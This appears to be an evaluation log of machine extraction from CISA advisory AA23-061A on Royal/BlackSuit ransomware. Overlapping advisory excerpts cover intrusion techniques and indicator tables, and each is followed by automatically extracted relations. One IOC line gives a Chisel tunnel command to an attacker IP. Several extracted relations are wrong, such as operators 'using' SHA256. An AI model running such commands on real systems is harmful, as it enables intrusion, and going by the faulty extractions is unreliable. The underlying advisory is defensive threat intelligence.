BlackSuit uses a unique partial encryption approach that allows the threat actor to choose a specific percentage of data in a file to encrypt. This approach allows the actor to lower the encryption percentage for larger files, which helps evade detection, and also significantly improves ransomware speed.[1] In addition to encrypting files, BlackSuit actors also engage in double extortion tactics in which they threaten to publicly release the exfiltrated data if the victim does not pay the ransom.
BlackSuit actors gain initial access to victim networks in several ways, including:
Phishing. According to third-party reporting, BlackSuit actors most commonly gain initial access to victim networks via phishing emails [T1566].
According to open source reporting, victims have unknowingly installed malware that delivers BlackSuit ransomware after receiving phishing emails containing malicious PDF documents [T1566.001] and malvertising [T1566.002].[2]
Remote Desktop Protocol (RDP). The second most common vector (around 13.3% of incidents) BlackSuit actors use for initial access is RDP compromise [T1021.001].
Public-facing applications. FBI has observed BlackSuit actors gain initial access through exploiting vulnerable public-facing applications [T1190].
Brokers. Reports from trusted third-party sources indicate that BlackSuit actors may leverage initial access brokers to gain initial access and source traffic by harvesting virtual private network (VPN) credentials from stealer logs [T1650].
Command and Control
Once BlackSuit actors gain access to a network, they communicate with command and control (C2) infrastructure and download multiple tools [T1105]. Legitimate Windows software is repurposed by BlackSuit actors to strengthen their foothold within the victim’s network. Ransomware operators often use open source projects to aid their intrusion activities.
Historically, Royal actors were observed leveraging Chisel, Secure Shell (SSH) client, PuTTY, OpenSSH, and MobaXterm [T1572], to communicate with their C2 infrastructure.


- BlackSuit actors -> USES_TECHNIQUE -> T1566
  Literal support: According to third-party reporting, BlackSuit actors most commonly gain initial access to victim networks via phishing emails [T1566].
- BlackSuit -> USES_TECHNIQUE -> T1566.001
  Literal support: According to open source reporting, victims have unknowingly installed malware that delivers BlackSuit ransomware after receiving phishing emails containing malicious PDF documents [T1566.001] and malvertising [T1566.002].[2]
- BlackSuit actors -> USES_TECHNIQUE -> T1021.001
  Literal support: The second most common vector (around 13.3% of incidents) BlackSuit actors use for initial access is RDP compromise [T1021.001].
- BlackSuit actors -> USES_TECHNIQUE -> T1190
  Literal support: FBI has observed BlackSuit actors gain initial access through exploiting vulnerable public-facing applications [T1190].

## AA23-061A:evaluation:llama500:6346:8622

Status: candidates_ready_for_review
Case time: 3.17 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

’s network. Ransomware operators often use open source projects to aid their intrusion activities.
Historically, Royal actors were observed leveraging Chisel, Secure Shell (SSH) client, PuTTY, OpenSSH, and MobaXterm [T1572], to communicate with their C2 infrastructure.
Lateral Movement and Persistence
(Updated August 7, 2024) Historically, Royal threat actors used RDP and legitimate operating system (OS) diagnostic tools to move laterally across a network [T1021.001]. BlackSuit actors used RDP and PsExec as well but also use SMB [T1021.001] to move laterally. In one confirmed case, BlackSuit actors used a legitimate admin account [T1078] to remotely log on to the domain controller via SMB. Once on the domain controller, the threat actor deactivated antivirus software [T1562.001] by modifying Group Policy Objects [T1484.001].
(Updated August 7, 2024) FBI observed BlackSuit actors using legitimate remote monitoring and management (RMM) software to maintain persistence in victim networks [T1133].
(New August 7, 2024) BlackSuit actors use SystemBC and Gootloader malware to load additional tools and maintain persistence.
Discovery and Credential Access
(New August 7, 2024) BlackSuit actors have been observed using SharpShares and SoftPerfect NetWorx to enumerate victim networks. The publicly available credential stealing tool Mimikatz and password harvesting tools from Nirsoft have also been found on victim systems. Tools such as PowerTool and GMER are often used to kill system processes.
Exfiltration
BlackSuit actors exfiltrate data from victim networks by repurposing legitimate cyber penetration testing tools, such as Cobalt Strike, and malware tools/derivatives, such as Ursnif/Gozi, for data aggregation and exfiltration. According to third-party reporting, BlackSuit actors’ first hop in exfiltration and other operations is usually a U.S. IP address.
(New August 7, 2024) BlackSuit actors also use RClone and Brute Ratel for exfiltration.
Encryption
Before starting the encryption process, BlackSuit actors:
Use Windows Restart Manager to determine whether targeted files are currently in use or blocked by other applications [T1486].[1]
Use Windows Volume Shadow Copy service (vssadmin.exe) to delete shadow copies to inhibit system recovery.[1]


- Royal actors -> USES_TECHNIQUE -> T1572
  Literal support: Historically, Royal actors were observed leveraging Chisel, Secure Shell (SSH) client, PuTTY, OpenSSH, and MobaXterm [T1572]
- Royal threat actors -> USES_TECHNIQUE -> T1021.001
  Literal support: (Updated August 7, 2024) Historically, Royal threat actors used RDP and legitimate operating system (OS) diagnostic tools to move laterally across a network [T1021.001].
- BlackSuit actors -> USES -> PsExec
  Literal support: BlackSuit actors used RDP and PsExec as well but also use SMB [T1021.001] to move laterally.
- BlackSuit actors -> USES_TECHNIQUE -> T1021.001
  Literal support: BlackSuit actors used RDP and PsExec as well but also use SMB [T1021.001] to move laterally.

## AA23-061A:evaluation:llama500:8314:10530

Status: candidates_ready_for_review
Case time: 1.86 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

Encryption
Before starting the encryption process, BlackSuit actors:
Use Windows Restart Manager to determine whether targeted files are currently in use or blocked by other applications [T1486].[1]
Use Windows Volume Shadow Copy service (vssadmin.exe) to delete shadow copies to inhibit system recovery.[1]
FBI has found numerous batch (.bat) files on impacted systems which are typically transferred as an encrypted 7zip file. Batch files create a new admin user [T1078.002], force a group policy update, set pertinent registry keys to auto-extract [T1119] and execute the ransomware, monitor the encryption process, and delete files upon completion—including Application, System, and Security event logs [T1070.001]. Registry Keys created can be modified and deleted to enable persistence on the victim’s system.
Malicious files have been found in victim networks in the following directories:
C:\Temp\
C:\Users\<user>\AppData\Roaming\
C:\Users\<users>\
C:\ProgramData\
Root C:\ directory has also served as a storage location for malicious files. BlackSuit actors have been observed using legitimate software and open source tools during ransomware operations.
Indicators of Compromise (IOCs)
See Table 1 through Table 5 for Royal ransomware IOCs obtained by FBI during threat response activities as of January 2023.
(New November 13, 2023) See Table 6 and Table 7 for Royal and BlackSuit Ransomware IOCs as of June 2023. See Table 8 for a list of legitimate software used by Royal and BlackSuit threat actors identified through FBI investigations as of June 2023.
(New August 7, 2024) See Table 9 through Table 15 for BlackSuit ransomware IOCs obtained by FBI during threat response activities as of July 2024 and Figure 1 for a sample ransom note.
Disclaimer: Some of the observed IP addresses are several years old. FBI and CISA recommend vetting or investigating these IP addresses prior to taking forward-looking action, such as blocking.
Royal IOCs as of January 2023
Table 1: Royal Ransomware Associated Files as of January 2023
IOC
Description
.royal
Encrypted file extension
README.TXT
Ransom note
Table 2: Royal Ransomware Associated IP addresses as of January 2023
Malicious IP
Last Observed Activity


- BlackSuit actors -> USES_TECHNIQUE -> T1486
  Literal support: Before starting the encryption process, BlackSuit actors:
Use Windows Restart Manager to determine whether targeted files are currently in use or blocked by other applications [T1486].[1]
- BlackSuit actors -> USES -> vssadmin.exe
  Literal support: Before starting the encryption process, BlackSuit actors:
Use Windows Restart Manager to determine whether targeted files are currently in use or blocked by other applications [T1486].[1]
Use Windows Volume Shadow Copy service (vssadmin.exe) to delete shadow copies to inhibit system recovery.[1]

## AA23-061A:evaluation:llama500:10300:11484

Status: empty_extraction
Case time: 0.39 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

 Royal Ransomware Associated Files as of January 2023
IOC
Description
.royal
Encrypted file extension
README.TXT
Ransom note
Table 2: Royal Ransomware Associated IP addresses as of January 2023
Malicious IP
Last Observed Activity
102.157.44[.]105
November 2022
105.158.118[.]241
November 2022
105.69.155[.]85
November 2022
113.169.187[.]159
November 2022
134.35.9[.]209
November 2022
139.195.43[.]166
November 2022
139.60.161[.]213
November 2022
148.213.109[.]165
November 2022
163.182.177[.]80
November 2022
181.141.3[.]126
November 2022
181.164.194[.]228
November 2022
185.143.223[.]69
November 2022
186.64.67[.]6
November 2022
186.86.212[.]138
November 2022
190.193.180[.]228
November 2022
196.70.77[.]11
November 2022
197.11.134[.]255
November 2022
197.158.89[.]85
November 2022
197.204.247[.]7
November 2022
197.207.181[.]147
November 2022
197.207.218[.]27
November 2022
197.94.67[.]207
November 2022
23.111.114[.]52
November 2022
41.100.55[.]97
November 2022
41.107.77[.]67
November 2022
41.109.11[.]80
November 2022
41.251.121[.]35
November 2022
41.97.65[.]51
November 2022
42.189.12[.]36
November 2022
45.227.251[.]167
November 2022
5.44.42[.]20
November 2022
61.166.221[.]46



## AA23-061A:evaluation:llama500:11361:12517

Status: empty_extraction
Case time: 0.38 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

[.]51
November 2022
42.189.12[.]36
November 2022
45.227.251[.]167
November 2022
5.44.42[.]20
November 2022
61.166.221[.]46
November 2022
68.83.169[.]91
November 2022
81.184.181[.]215
November 2022
82.12.196[.]197
November 2022
98.143.70[.]147
November 2022
140.82.48[.]158
December 2022
147.135.36[.]162
December 2022
147.135.11[.]223
December 2022
152.89.247[.]50
December 2022
172.64.80[.]1
December 2022
179.43.167[.]10
December 2022
185.7.214[.]218
December 2022
193.149.176[.]157
December 2022
193.235.146[.]104
December 2022
209.141.36[.]116
December 2022
45.61.136[.]47
December 2022
45.8.158[.]104
December 2022
5.181.234[.]58
December 2022
5.188.86[.]195
December 2022
77.73.133[.]84
December 2022
89.108.65[.]136
December 2022
94.232.41[.]105
December 2022
47.87.229[.]39
January 2023
Table 3: Royal Ransomware Associated Domains as of January 2023
Malicious Domain
Last Observed Activity
sombrat[.]com
October 2022
gororama[.]com
November 2022
softeruplive[.]com
November 2022
altocloudzone[.]live
December 2022
ciborkumari[.]xyz
December 2022
myappearinc[.]com
December 2022
parkerpublic[.]com
December 2022
pastebin.mozilla[.]org/Z54Vudf9/raw



## AA23-061A:evaluation:llama500:12363:13460

Status: candidates_ready_for_review
Case time: 1.68 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

.]live
December 2022
ciborkumari[.]xyz
December 2022
myappearinc[.]com
December 2022
parkerpublic[.]com
December 2022
pastebin.mozilla[.]org/Z54Vudf9/raw
December 2022
tumbleproperty[.]com
December 2022
myappearinc[.]com/acquire/draft/c7lh0s5jv
January 2023
Table 4: Tools Used by Royal Operators
Tool
SHA256
AV tamper
8A983042278BC5897DBCDD54D1D7E3143F8B7EAD553B5A4713E30DEFFDA16375
TCP/UDP Tunnel over HTTP (Chisel)
8a99353662ccae117d2bb22efd8c43d7169060450be413af763e8ad7522d2451
Ursnif/Gozi
be030e685536eb38ba1fec1c90e90a4165f6641c8dc39291db1d23f4ee9fa0b1
Exfil
B8C4AEC31C134ADBDBE8AAD65D2BCB21CFE62D299696A23ADD9AA1DE082C6E20
Remote Access (AnyDesk)
4a9dde3979c2343c024c6eeeddff7639be301826dd637c006074e04a1e4e9fe7
PowerShell Toolkit Downloader
4cd00234b18e04dcd745cc81bb928c8451f6601affb5fa45f20bb11bfb5383ce
PsExec (Microsoft Sysinternals)
08c6e20b1785d4ec4e3f9956931d992377963580b4b2c6579fd9930e08882b1c
Keep Host Unlocked (Don’t Sleep)
f8cff7082a936912baf2124d42ed82403c75c87cb160553a7df862f8d81809ee
Ransomware Executable
d47d4b52e75e8cf3b11ea171163a66c06d1792227c1cf7ca49d7df60804a1681


- Royal Operators -> USES -> Royal
  Literal support: Table 4: Tools Used by Royal Operators
- Royal Operators -> USES -> SHA256
  Literal support: Table 4: Tools Used by Royal Operators
Tool
SHA256

## AA23-061A:evaluation:llama500:13347:14347

Status: candidates_ready_for_review
Case time: 2.32 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

cb160553a7df862f8d81809ee
Ransomware Executable
d47d4b52e75e8cf3b11ea171163a66c06d1792227c1cf7ca49d7df60804a1681
Windows Command Line (NirCmd)
216047C048BF1DCBF031CF24BD5E0F263994A5DF60B23089E393033D17257CB5
System Management (NSudo)
19896A23D7B054625C2F6B1EE1551A0DA68AD25CDDBB24510A3B74578418E618
AV tamper
8A983042278BC5897DBCDD54D1D7E3143F8B7EAD553B5A4713E30DEFFDA16375
TCP/UDP Tunnel over HTTP (Chisel)
8a99353662ccae117d2bb22efd8c43d7169060450be413af763e8ad7522d2451
Ursnif/Gozi
be030e685536eb38ba1fec1c90e90a4165f6641c8dc39291db1d23f4ee9fa0b1
Exfil
B8C4AEC31C134ADBDBE8AAD65D2BCB21CFE62D299696A23ADD9AA1DE082C6E20
Remote Access (AnyDesk)
4a9dde3979c2343c024c6eeeddff7639be301826dd637c006074e04a1e4e9fe7
PowerShell Toolkit Downloader
4cd00234b18e04dcd745cc81bb928c8451f6601affb5fa45f20bb11bfb5383ce
PsExec (Microsoft Sysinternals)
08c6e20b1785d4ec4e3f9956931d992377963580b4b2c6579fd9930e08882b1c
Keep Host Unlocked (Don’t Sleep)
f8cff7082a936912baf2124d42ed82403c75c87cb160553a7df862f8d81809ee


- Royal Operators -> USES -> Ransomware Executable
  Literal support: Ransomware Executable
- Royal Operators -> USES -> Ursnif
  Literal support: Ursnif/Gozi
- Royal Operators -> USES -> PsExec
  Literal support: PsExec (Microsoft Sysinternals)

## AA23-061A:evaluation:llama500:14225:15219

Status: candidates_ready_for_review
Case time: 1.02 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

4b2c6579fd9930e08882b1c
Keep Host Unlocked (Don’t Sleep)
f8cff7082a936912baf2124d42ed82403c75c87cb160553a7df862f8d81809ee
Ransomware Executable
d47d4b52e75e8cf3b11ea171163a66c06d1792227c1cf7ca49d7df60804a1681
Windows Command Line (NirCmd)
216047C048BF1DCBF031CF24BD5E0F263994A5DF60B23089E393033D17257CB5
System Management (NSudo)
19896A23D7B054625C2F6B1EE1551A0DA68AD25CDDBB24510A3B74578418E618
Table 5: Batch Script Tools Used by Royal Operators
File name
Hash Value
2.bat
585b05b290d241a249af93b1896a9474128da969
3.bat
41a79f83f8b00ac7a9dd06e1e225d64d95d29b1d
4.bat
a84ed0f3c46b01d66510ccc9b1fc1e07af005c60
8.bat
c96154690f60a8e1f2271242e458029014ffe30a
kl.bat
65dc04f3f75deb3b287cca3138d9d0ec36b8bea0
gp.bat
82f1f72f4b1bfd7cc8afbe6d170686b1066049bc7e5863b51aa15ccc5c841f58
r.bat
74d81ef0be02899a177d7ff6374d699b634c70275b3292dbc67e577b5f6a3f3c
runanddelete.bat
342B398647073159DFA8A7D36510171F731B760089A546E96FBB8A292791EFEE
Royal and BlackSuit IOCs as of June 2023 (New November 13, 2023)


- Royal Operators -> USES -> Royal
  Literal support: Table 5: Batch Script Tools Used by Royal Operators

## AA23-061A:evaluation:llama500:15072:16294

Status: candidates_ready_for_review
Case time: 3.16 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

runanddelete.bat
342B398647073159DFA8A7D36510171F731B760089A546E96FBB8A292791EFEE
Royal and BlackSuit IOCs as of June 2023 (New November 13, 2023)
Table 6: Royal Ransomware Associated Files, Tools, and Hashes as of June 2023
Name
Description or SHA 256 Hash Value
C:\Users\Public\conhost.exe client 149.28.73.161:443 R:149.28.73.161:43657:socks
Executed on the victim’s machine, uses a Chisel client to tunnel traffic through port 443 instead of port 43657.
royal_w
Encryption extension
%PROGRAMDATA%
Ransomware Filepath
%TEMP%\execute.bat
InstallerV20.8.msi
windows_encryptor.exe
85087f28a84205e344d7e8e06979e6622fab0cfe1759fd24e38cd0390bca5fa6
%PROGRAMDATA%\wine.exe
5b08c02c141eab94a40b56240a26cab7ff07e9a6e760dfde8b8b053a3526f0e6
%USERPROFILE%\Downloads\run1.bat
bc609cf53dde126b766d35b5bcf0a530c24d91fe23633dad6c2c59fd1843f781
%USERPROFILE%\Downloads\run2.bat
13c25164791d3436cf2efbc410caec6b6dd6978d7e83c4766917630e24e1af10
%USERPROFILE%\Downloads\run3.bat
2b93206d7a36cccdf7d7596b90ead301b2ff7e9a96359f39b6ba31bb13d11f45
%USERPROFILE%\Downloads\run4.bat
84e1efbed6bb7720caea6720a8bff7cd93b5d42fb1d71ef8031bfd3897ed4435
%USERPROFILE%\Downloads\sc.bat
e0dbe3a2d07ee10731b68a142c65db077cfb88e5ec5c8415e548d3ede40e7ffc


- Royal Operators -> USES -> runanddelete.bat
  Literal support: runanddelete.bat
- Royal Operators -> USES -> Royal
  Literal support: Royal and BlackSuit IOCs as of June 2023 (New November 13, 2023)
- Royal Operators -> USES -> conhost.exe
  Literal support: C:\Users\Public\conhost.exe client 149.28.73.161:443 R:149.28.73.161:43657:socks
- Royal Operators -> USES -> Ransomware Filepath
  Literal support: Ransomware Filepath

## AA23-061A:evaluation:llama500:16175:17122

Status: empty_extraction
Case time: 0.43 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

d71ef8031bfd3897ed4435
%USERPROFILE%\Downloads\sc.bat
e0dbe3a2d07ee10731b68a142c65db077cfb88e5ec5c8415e548d3ede40e7ffc
%USERPROFILE%\Downloads\sr.bat
34a98f2b54ebab999f218b0990665485eb2bb74babdf7e714cc10a306616b00c
runanddelete.bat
342b398647073159dfa8a7d36510171f731b760089a546e96fbb8a292791efee
scripttodo.ps1 (94.232.41.105)
4cd00234b18e04dcd745cc81bb928c8451f6601affb5fa45f20bb11bfb5383ce
dontsleep.exe
f8cff7082a936912baf2124d42ed82403c75c87cb160553a7df862f8d81809ee
wstart.exe
d47d4b52e75e8cf3b11ea171163a66c06d1792227c1cf7ca49d7df60804a1681
InstallerV8.1.ms
3e6e2e0de75896033d91dfd07550c478590ca4cd4598004d9e19246e8a09cb97
shutdowni.bat
8a983042278bc5897dbcdd54d1d7e3143f8b7ead553b5a4713e30deffda16375
f827.exe
5654f32a4f0f2e900a35761e8caf7ef0c50ee7800e0a3b19354b571bc6876f61
d2ef5.exe
be030e685536eb38ba1fec1c90e90a4165f6641c8dc39291db1d23f4ee9fa0b1
f24dc8ea.msi
91605641a4c7e859b7071a9841d1cd154b9027e6a58c20ec4cadafeaf47c9055
defw10.bat



## AA23-061A:evaluation:llama500:17023:18422

Status: empty_extraction
Case time: 0.43 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

4ee9fa0b1
f24dc8ea.msi
91605641a4c7e859b7071a9841d1cd154b9027e6a58c20ec4cadafeaf47c9055
defw10.bat
fb638dba20e5fec72f5501d7e0627b302834ec5eaf331dd999763ee925cbc0f9
ll.exe
f0197bd7ccd568c523df9c7d9afcbac222f14d344312322c04c92e7968859726
Royal Ransomware Hash
b987f738a1e185f71e358b02cafa5fe56a4e3457df3b587d6b40e9c9de1da410
b34v2.dll
a51b1f1f0636bff199c0f87e2bb300d42e06698b
1.exe
d93f1ef533e6b8c95330ba0962e3670eaf94a026
34.dll
9e19afc15c5781e8a89a75607578760aabad8e65
ll.exe
9a92b147cad814bfbd4632b6034b8abf8d84b1a5
Royal Ransomware Hash
a4ef01d55e55cebdd37ba71c28b0c448a9c833c0
Table 7: BlackSuit Ransomware Associated Files, Tools, and Hashes as of June 2023
IP Address
MD5 Hash Value
sys32.exe
30cc7724be4a09d5bcd9254197af05e9fab76455
esxi_encryptor
861793c4e0d4a92844994b640cc6bc3e20944a73
BlackSuit threat actors have been observed using legitimate software and open source tools during ransomware operations. Threat actors have been observed using open source network tunneling tools such as Chisel and Cloudflared, as well as Secure Shell (SSH) Client, OpenSSH, and MobaXterm to establish SSH connections. The publicly available credential stealing tool Mimikatz and password harvesting tools from Nirsoft have also been found on victim systems. Legitimate RMM tools have also been observed as backdoor access vectors. Some legitimate software and open source tools can be found in Table 8.



## AA23-061A:evaluation:llama500:18102:19740

Status: empty_extraction
Case time: 0.59 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

term to establish SSH connections. The publicly available credential stealing tool Mimikatz and password harvesting tools from Nirsoft have also been found on victim systems. Legitimate RMM tools have also been observed as backdoor access vectors. Some legitimate software and open source tools can be found in Table 8.
Table 8: Legitimate Files and Tools Used by Royal and BlackSuit Ransomware
Name
Description or SHA 256 Hash Value
C:\Program Files\OpenSSH\ssh-agent.exe
C:\Program Files\OpenSSH\sshd.exe
SSH Client
%USERPROFILE%\Downloads\WinRAR.exe
Compression tool
%APPDATA%\MobaXterm\
Toolbox for remote computing
\Program Files (x86)\Mobatek\
Toolbox for remote computing
\Program Files (x86)\Mobatek\MobaXterm\
Toolbox for remote computing
b34v2.dll
ColbaltStrike Beacon
34.dll
CobaltStrike Beacon
mimikatz.exe
Mimikatz credential harvester
dialuppass.exe
Nirsoft password harvesting utility
iepv.exe
Nirsoft password harvesting utility
mailpv.exe
Nirsoft password harvesting utility
netpass.exe
Nirsoft password harvesting utility
routerpassview.exe
Nirsoft password harvesting utility
AdFind.exe
ADFind tool
LogMeIn
Remote access tool
Atera
Remote access tool
C:\Program Files\Eraser\Eraser.exe
Anti-Forensics Tool used by TA
advanced_ip_scanner.exe
Reconnaissance Tool used by TA
conhost.exe (chisel_windows_1_7_7.exe)
b9ef2e948a9b49a6930fc190b22cbdb3571579d37a4de56564e41a2ef736767b
%USERPROFILE%\Downloads\svvhost.exe
\Users\Administrator\AppData\Local\Temp\cloudflared.exe
c429719a45ca14f52513fe55320ebc49433c729a0d2223479d9d43597eab39fa
nircmd.exe
216047c048bf1dcbf031cf24bd5e0f263994a5df60b23089e393033d17257cb5
nsudo.exe



## AA23-061A:evaluation:llama500:19628:21225

Status: candidates_ready_for_review
Case time: 3.16 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

a0d2223479d9d43597eab39fa
nircmd.exe
216047c048bf1dcbf031cf24bd5e0f263994a5df60b23089e393033d17257cb5
nsudo.exe
19896a23d7b054625c2f6b1ee1551a0da68ad25cddbb24510a3b74578418e618
IOCs as of July 2024 (New August 7, 2024)
Disclaimer: Several of these observed IP addresses were first observed as early as 2023, although the most recent are from July of 2024 and have been historically linked to BlackSuit (formerly known as Royal) Ransomware. IP addresses in this advisory were maliciously used during the time range highlighted below, and may have been used for legitimate purposes outside of that time span. FBI and CISA recommend these IP addresses be investigated or vetted by organizations prior to taking action, such as blocking.
Table 9: Malicious URL (s) associated with BlackSuit Ransomware
URL Association
Malicious URLs
URLs from malicious PowerShell on P0, potentially debug.ps1
https://1tvnews[.]af/xmlrpc.php
https://avpvuurwerk[.]nl/xmlrpc.php
https://beautyhabits[.]gr/xmlrpc.php
https://interpolyaris[.]ru/xmlrpc.php
https://libertygospeltracts[.]com/xmlrpc.php
https://oldtimertreffen-rethem[.]de/xmlrpc.php
https://parencyivf[.]com/xmlrpc.php
https://pikaluna[.]com/xmlrpc.php
https://stroeck[.]at/xmlrpc.php
URL associated to BRC4 / Brute Ratel
megupdate[.]com
URLs associated to Exfiltration
mystuff[.]bublup[.]com
URL associated to Cobalt Strike C2
provincial-gaiters-gw[.]aws-use1[.]cloud-ara[.]tyk[.]io
URL associated to Initial Access Download
zoommanager[.]com
Table 10: BlackSuit Ransomware Associated Files and Hash Values
Filename
Hash Value – SHA-256
Description
1.exe


- Royal and BlackSuit Ransomware -> USES -> nircmd.exe
  Literal support: nircmd.exe
- Royal and BlackSuit Ransomware -> USES -> nsudo.exe
  Literal support: nsudo.exe
- Royal and BlackSuit Ransomware -> USES -> debug.ps1
  Literal support: URLs from malicious PowerShell on P0, potentially debug.ps1
- Royal and BlackSuit Ransomware -> USES -> ps1
  Literal support: URLs from malicious PowerShell on P0, potentially debug.ps1

## AA23-061A:evaluation:llama500:21018:22127

Status: empty_extraction
Case time: 0.42 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

[.]aws-use1[.]cloud-ara[.]tyk[.]io
URL associated to Initial Access Download
zoommanager[.]com
Table 10: BlackSuit Ransomware Associated Files and Hash Values
Filename
Hash Value – SHA-256
Description
1.exe
af9f95497b8503af1a399bc6f070c3bbeabc5aeecd8c09bca80495831ae71e61
Encryptor
PowerTool64.exe
Hacktool
aaa.exe
C4A2227CD8D85128EAFEF8EE2298AA105DA892C8B0F37405667C2D1647C35C46
Encryptor
aaa.exe
8d16a23d5a5630502b09c33fbc571d2261c6c98fecc3a79a1e1129354f930d0a
Wen.exe
01ce9cfebb29596d0ab7c99e8dbadf1a8409750b183e6bf73e0de021b365be13
etmc.exe
a0a4a99948e12309f54911264261d96f0e40d5fd695bab82e95fbc1f9024482e
svchost.exe
9bbc9784ce3c818a127debfe710ec6ce21e7c9dd0daf4e30b8506a6dba533db4
Data Exfiltration Tool ­– Renamed version of RClone.exe
locker_N1uYkmEsfoHmT4lK66trUjBuy5gyAj7n.ex_
146335b1be627318ac09476f0c8f8e6e027805e6077673f72d6dce1677a24c78
socks32.exe
9493b512d7d15510ebee5b300c55b67f9f2ff1dda64bddc99ba8ba5024113300
C:\users\Administrator\AppData\Local\msa.ps1
SystemBC backdoor
%APPDATA%\ Zoom\Alternative Workplace Strategies.js
E813F8FAF3AA2EB20E285596413F5088B2D7FD153FE9F72F3FF45735D0FDDCED



## AA23-061A:evaluation:llama500:21984:23147

Status: empty_extraction
Case time: 0.43 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

msa.ps1
SystemBC backdoor
%APPDATA%\ Zoom\Alternative Workplace Strategies.js
E813F8FAF3AA2EB20E285596413F5088B2D7FD153FE9F72F3FF45735D0FDDCED
Gootloader infection
C:\Users\Public\socks.ps1
25A6F82936134A6C5C0066F382530B9D6BF2C8DA6FEAFE028F166B1A9D7283CF
PowerShell Backdoor
HKEY_USERS\S-1-5-18\Software\Microsoft\Windows\CurrentVersion\Run (Value == socks_powershell)
Executes socks.ps1 on reboot
share$.zip
e3d7c012040962acd66f395d1c5c5f73f305aa1058f2111e8e37d9cb213b80c4
Contains _COPY.bat, PsExec.exe, etmc.exe, and _EXEC.bat to deploy encryptor (etmc.exe) across environment using domain admin credentials
socss.exe
C798B2690C5F16EB2917A679AF3117CFE9C7060FA8BC84FFC3159338EF33508E
Malware
qq.exe
3c8c1b1f53e0767b7291bb1ae605ffa62a93e9c8cc783e4ca47ac84b48320d59
gomer.exe
A renamed executable of GMER used for defense evasion
288-csrss.exe
ee6ec2810910c6d2a2957f041edd1e39dca4266a1cc8009ae6d7315aba9196f5
372-winlogon.exe
68c57daed0e5899c49b827042bcf3bbeba33b524bd83315a44d889721664dc34
776-svchost.exe
bbb7404419f91f82cedfec915931a9339f04165b27d8878d63827c9ee421ed62
Exe.exe, aaaa.exe, qq.exe
338228a3e79f3993abc102cbac2ff253c84965213d59ac30892538cdd9b0a22b



## AA23-061A:evaluation:llama500:23031:24536

Status: empty_extraction
Case time: 0.51 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

27d8878d63827c9ee421ed62
Exe.exe, aaaa.exe, qq.exe
338228a3e79f3993abc102cbac2ff253c84965213d59ac30892538cdd9b0a22b
Ransomware file
Mwntv.sys
6332f189cc71df646ff0f1b9b02a005c9ebda3fe7b9712976660746913b030de
Potential Tool Ingress
Un_A.exe
Malicious binary for attempting to disable/uninstall security software
Un_B.erxe
Malicious binary for attempting to disable/uninstall security software
Table 11: Batch Script Tools Used by BlackSuit Ransomware Operators and Hash Values
Filename
Description
Hash Value – SHA-256
2.bat
Batch Script to copy and execute encryptor
3041dfc13f356c2f0133a9c11a258f87cb7de1e17bc435e9b623d74bc5e1c6be
C:\share$\_EXEC.bat
Execute encrypter
8F87A1542EE790623896BBAAB933D1883484DE02A7B3D65D6C791D50173A923D
fstart.bat
A batch script used to enable remote services, perform anti-forensics, and enable clear-text passwords in memory
NLA.bat
A batch script used to disable Network Level Authentication (NLA) for Remote Desktop Services (RDS)
av.bat
A batch script that searches for presence of an application and uninstalls it
systeminfo.bat
A batch script used for system enumeration
mv.bat
A batch script used to move the PsExec executable and delete the netscan executable
Table 12: IP addresses from BlackSuit Ransomware Deployments (from November 2023 to July 2024)
IP Address
Time Range of Use
Description
143[.]244[.]146[.]183:443
May 2024
Unknown C2 – potential SOCKS Proxy
45[.]141[.]87[.]218:9000
May 2024
Arechclient2 Backdoor/SecTopRAT
45[.]141[.]87[.]218:443
May 2024



## AA23-061A:evaluation:llama500:24400:25638

Status: empty_extraction
Case time: 0.45 seconds; attempts: 1.

Source: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a

Exact source window:

4
Unknown C2 – potential SOCKS Proxy
45[.]141[.]87[.]218:9000
May 2024
Arechclient2 Backdoor/SecTopRAT
45[.]141[.]87[.]218:443
May 2024
Arechclient2 Backdoor/SecTopRAT
184.174.96[.]16
May 2024
Associated with download of the binary vm.dll
89.251.22[.]32
May 2024
Cobalt Strike
135.148.67[.]84
May 2024
Resolves to domain turnovercheck[.]com
180.131.145[.]85
May 2024
Associated with malicious PowerShell execution
180.131.145[.]61
May 2024
SystemBC Command & Control
138.199.53[.]226
Feb 2024
184.166.211[.]74
Feb 2024
185.190.24[.]103
Feb 2024
5.181.234[.]58
Feb 2024
137.220.61[.]94
Nov – Feb 2024
connecting outbound from Socss.exe
193.37.69[.]116
Nov – Jan 2024
Associated with exfiltration
144.202.120[.]122
Nov 2023
socks1.ps1 backdoor; SystemBC Backdoor C2; www.recruitment-interview[.]org (C2 SystemBC)
104.21.58[.]219:443
Nov 2023
Cobalt Strike
141.98.80[.]181:80
Nov 2023
Cobalt Strike
144.202.120[.]122:433
Nov 2023
PowerShell Reverse Proxy
155.138.150[.]236:8088
Nov 2023
PowerShell Reverse Proxy
140.82.18[.]48
Nov 2023
141.98.80[.]181
Nov 2023
44.202.120[.]122
Nov 2023
45.76.225[.]156
Nov 2023
Table 13: Legitimate Files and Tools Used by Black Suit Ransomware (1 of 3)
File name
Hash Value – SHA-256
Description
